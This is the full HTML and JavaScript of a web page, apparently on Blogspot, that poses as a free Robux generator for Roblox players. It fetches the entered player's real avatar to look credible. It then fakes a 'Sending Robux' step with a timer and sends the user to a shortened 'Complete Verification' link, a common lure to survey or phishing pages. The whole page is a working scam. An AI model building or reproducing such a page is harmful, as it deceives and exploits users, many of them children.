<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'/>
    <meta content='width=device-width, initial-scale=1.0' name='viewport'/>
    <title>Home</title>
    <script src='https://cdn.tailwindcss.com'></script>
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&family=Poppins:wght@400;600;700;900&display=swap");
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Kumbh Sans", sans-serif;
        }
        body {
            background-color: #f2f4f5;
            color: #393b3d;
        }
        nav {
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: #dee1e3;
            border-bottom: 1px solid #c7cbce;
            padding: 0 40px;
        }
        .logo {
            width: 30px;
            display: flex;
            align-items: center;
        }
        .logo span {
            font-weight: 900;
            margin-right: 18px;
            font-size: 25px;
        }
        nav ul {
            list-style: none;
            display: flex;
        }
        nav ul li {
            margin-left: 30px;
        }
        img {
            max-width: 100%;
        }
        @keyframes loupeOrbitGlow {
            0%   { transform: rotate(0deg) translateX(10px) rotate(0deg); filter: drop-shadow(0 0 0px #9ca3af); }
            25%  { transform: rotate(90deg) translateX(10px) rotate(-90deg); filter: drop-shadow(0 0 6px #9ca3af); }
            50%  { transform: rotate(180deg) translateX(10px) rotate(-180deg); filter: drop-shadow(0 0 10px #9ca3af); }
            75%  { transform: rotate(270deg) translateX(10px) rotate(-270deg); filter: drop-shadow(0 0 6px #9ca3af); }
            100% { transform: rotate(360deg) translateX(10px) rotate(-360deg); filter: drop-shadow(0 0 0px #9ca3af); }
        }
        .animate-loupe-orbit-glow {
            animation: loupeOrbitGlow 2s linear infinite;
            transform-origin: center;
        }
        @keyframes sonarPulse {
            0% { transform: scale(0.8); opacity: 0.6; }
            50% { transform: scale(1.4); opacity: 0.2; }
            100% { transform: scale(2); opacity: 0; }
        }
        .animate-sonar {
            animation: sonarPulse 2s ease-out infinite;
        }
        .animate-fade-in {
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        #checkmark {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            animation: stroke 0.6s ease-in-out forwards;
        }
        .checkmark-check {
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: stroke 0.4s 0.6s ease-in-out forwards;
        }
        .checkmark-circle {
            stroke-dasharray: 166;
            stroke-dashoffset: 166;
            animation: stroke 0.6s ease-in-out forwards;
        }
        @keyframes stroke {
            100% { stroke-dashoffset: 0; }
        }
        .animate-pulse-button {
            animation: pulseGlow 1.5s infinite;
        }
        @keyframes pulseGlow {
            0% { box-shadow: 0 0 0px rgba(72, 187, 120, 0.4); transform: scale(1); }
            50% { box-shadow: 0 0 10px rgba(72, 187, 120, 0.6); transform: scale(1.03); }
            100% { box-shadow: 0 0 0px rgba(72, 187, 120, 0.4); transform: scale(1); }
        }
         @keyframes sendPulse {
            0%, 100% { transform: translateY(0) scale(1); opacity: 1; }
            50% { transform: translateY(-6px) scale(1.1); opacity: 0.8; }
        }
        .animate-send {
            animation: sendPulse 1s infinite ease-in-out;
        }
    </style>
<link rel="me" href="https://www.blogger.com/profile/00125340272078018543" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
<body class='text-gray-900 min-h-screen relative'>

<nav>
    <div class='logo'>
        <span>☰</span>
        <img src='https://i.imgur.com/BlDJdmo.jpeg' alt="Logo"/>
    </div>
    <ul>
        <li>Charts</li>
        <li>Marketplace</li>
        <li>Robux</li>
    </ul>
</nav>

<!-- Error Modal -->
<div class='hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50' id='error-modal'>
    <div class='bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center'>
        <p class='text-red-600 font-semibold mb-4' id='error-modal-text'>Error</p>
        <button class='bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition' onclick='closeErrorModal()'>Close</button>
    </div>
</div>

<!-- Hero Banner -->
<div class='w-full h-52 md:h-64 relative overflow-hidden shadow-lg mb-3'>
    <img alt='Banner Roblox' class='absolute inset-0 w-full h-full object-cover' src='https://i.imgur.com/pnKIeyU.jpeg'/>
    <div class='absolute inset-0 bg-black bg-opacity-40 flex items-center justify-center'>
        <div class="text-center">
             <h1 class='text-3xl md:text-5xl font-bold text-white px-4'>Get Robux</h1>
             <p class='mt-6 text-sm font-normal text-white px-2'>Enter your Roblox username below so our admin can find your account and send you free Robux.</p>
        </div>
    </div>
</div>

<section class='max-w-xl mx-auto py-10 px-6 text-center'>
    <!-- Search Section -->
    <div id='first-content'>
        <input class='w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300' id='username' placeholder='Enter your Roblox username' type='text'/>
        <button class='bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6' id='search-button'>
            Search
        </button>
    </div>

    <!-- Loading Spinner -->
    <div class='hidden my-6 flex items-center justify-center flex-col relative' id='loading-spinner'>
        <div class='absolute animate-sonar w-20 h-20 rounded-full bg-gray-400/20'></div>
        <svg class='relative h-12 w-12 text-gray-600 animate-loupe-orbit-glow z-10' fill='none' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'>
            <path d='M21 21l-4.35-4.35M10.5 18a7.5 7.5 0 100-15 7.5 7.5 0 000 15z' stroke='currentColor' stroke-linecap='round' stroke-linejoin='round' stroke-width='2'></path>
        </svg>
        <span class='mt-2 text-gray-600 text-sm animate-pulse z-10'>Searching profile...</span>
    </div>

    <!-- Profile Display -->
    <div class='hidden text-center' id='profile'>
        <img class='w-24 h-24 mx-auto rounded-full mb-2 shadow-md' id='avatar' alt="User Avatar"/>
        <p class='text-xl font-semibold' id='display-name'></p>
    </div>

    <!-- Resource Selection -->
    <div class='hidden mt-8' id='resource-section'>
        <div class='grid grid-cols-2 gap-4'>
            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 800)'>
                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
                <p class='text-xl font-semibold'>800</p>
            </div>
            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 1700)'>
                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
                <p class='text-xl font-semibold'>1,700</p>
            </div>
            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 4500)'>
                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
                <p class='text-xl font-semibold'>4,500</p>
            </div>
            <div class='resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition' onclick='selectResource(this, 10000)'>
                <img alt='Robux Icon' class='w-8 h-8 mx-auto mb-2' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
                <p class='text-xl font-semibold'>10,000</p>
            </div>
        </div>
        <button class='hidden mt-6 bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-green-700 transition' id='confirm-button' onclick='confirmSelection()'>
          Confirm
        </button>
    </div>

    <!-- Sending Animation -->
    <div class='hidden mt-10 flex justify-center items-center flex-col' id='sending-animation'>
        <img alt='Sending Robux' class='w-10 h-10 animate-send' src='https://i.imgur.com/l9Qdc3C.jpeg'/>
        <p class='mt-2 text-sm text-gray-700 animate-pulse'>Sending Robux...</p>
    </div>

    <!-- Success Message -->
    <div class='hidden max-w-md mx-auto p-6 rounded-xl bg-green-100 shadow-md text-center animate-fade-in' id='success-message'>
        <div class='w-16 h-16 mx-auto mb-4'>
            <svg class='w-full h-full text-green-500' id='checkmark' viewBox='0 0 52 52'>
                <circle class='checkmark-circle' cx='26' cy='26' fill='none' r='25' stroke='currentColor' stroke-width='2'></circle>
                <path class='checkmark-check' d='M14 27l7 7 17-17' fill='none' stroke='currentColor' stroke-width='4'></path>
            </svg>
        </div>
        <h2 class='text-xl font-semibold text-green-700 mb-2'>Almost there!</h2>
        <p class='text-sm text-green-700 mb-4'>
          Robux are ready to be delivered. Please verify you're human to complete the process.
        </p>
        <a class='inline-block bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded-lg transition shadow-green-glow animate-pulse-button' href='https://smrturl.co/246a3e4' target='_blank'>
          ✅ Complete Verification
        </a>
    </div>
</section>

<script>
    document.addEventListener('DOMContentLoaded', (event) => {
        let selectedResource = null;
        
        const searchButton = document.getElementById('search-button');

        // Check if the button exists before adding an event listener
        if(searchButton) {
            searchButton.addEventListener('click', fetchProfile);
        } else {
            console.error("Search button not found!");
        }

        // --- Other functions ---

        window.selectResource = function(element, amount) {
            document.querySelectorAll('.resource-option').forEach(el => {
                el.classList.remove('bg-green-200', 'border-green-500');
            });
            element.classList.add('bg-green-200', 'border-green-500');
            selectedResource = amount;
            document.getElementById('confirm-button').classList.remove('hidden');
        }

        window.confirmSelection = function() {
            if (!selectedResource) {
                alert("Please select a Robux amount first.");
                return;
            }
            
            document.getElementById('profile').classList.add('hidden');
            document.getElementById('resource-section').classList.add('hidden');
            document.getElementById('sending-animation').classList.remove('hidden');

            setTimeout(() => {
                document.getElementById('sending-animation').classList.add('hidden');
                document.getElementById('success-message').classList.remove('hidden');
            }, 2000);
        }

        window.closeErrorModal = function() {
            document.getElementById('error-modal').classList.add('hidden');
        }

        async function fetchProfile() {
            const username = document.getElementById('username').value.trim();
            const errorModal = document.getElementById('error-modal');
            const errorText = document.getElementById('error-modal-text');
            const profileSection = document.getElementById('profile');
            const displayName = document.getElementById('display-name');
            const avatar = document.getElementById('avatar');
            const loadingSpinner = document.getElementById('loading-spinner');
            const resourceSection = document.getElementById('resource-section');
            const firstContent = document.getElementById('first-content');

            errorModal.classList.add('hidden');
            profileSection.classList.add('hidden');
            resourceSection.classList.add('hidden');
            document.getElementById('success-message').classList.add('hidden');
            
            if (!username) {
                errorText.textContent = "❌ Please enter a valid username.";
                errorModal.classList.remove('hidden');
                return;
            }

            loadingSpinner.classList.remove('hidden');
            firstContent.classList.add('hidden');

            try {
                // Step 1: Get User ID from username via roproxy
                const userResponse = await fetch('https://users.roproxy.com/v1/usernames/users', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({ usernames: [username], excludeBannedUsers: true })
                });

                if (!userResponse.ok) throw new Error('Network response was not ok.');
                
                const userData = await userResponse.json();

                if (!userData.data || userData.data.length === 0) {
                    throw new Error(`User not found: ${username}`);
                }

                const user = userData.data[0];
                const userId = user.id;

                // Step 2: Get user avatar
                const thumbnailResponse = await fetch(`https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`);

                if (!thumbnailResponse.ok) throw new Error('Failed to fetch avatar.');
                
                const thumbnailData = await thumbnailResponse.json();
                
                if (!thumbnailData.data || thumbnailData.data.length === 0 || !thumbnailData.data[0].imageUrl) {
                    throw new Error('Could not retrieve avatar image.');
                }
                
                // Success: Update UI
                loadingSpinner.classList.add('hidden');
                displayName.textContent = user.displayName;
                avatar.src = thumbnailData.data[0].imageUrl;
                
                profileSection.classList.remove('hidden');
                resourceSection.classList.remove('hidden');

            } catch (error) {
                console.error("Fetch profile error:", error);
                loadingSpinner.classList.add('hidden');
                firstContent.classList.remove('hidden');
                errorText.textContent = `❌ Can't find player '${username}'. Please check the username and try again.`;
                errorModal.classList.remove('hidden');
            }
        }
    });
</script>

</body>
</html>
